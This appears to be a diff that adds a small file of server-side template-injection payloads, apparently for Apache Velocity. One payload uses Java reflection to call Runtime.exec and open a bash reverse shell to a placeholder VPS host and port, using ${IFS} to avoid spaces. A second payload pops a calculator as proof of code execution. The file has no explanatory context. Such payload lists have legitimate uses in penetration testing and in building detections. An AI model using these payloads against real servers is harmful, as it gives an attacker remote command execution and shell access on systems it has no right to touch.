@@ -1,0 +1,6 @@
+$bizBean.class.class.forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/VPS-IP/VPS-PORT<&1")
+
+
+#set($e="e")
+${e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")}
+
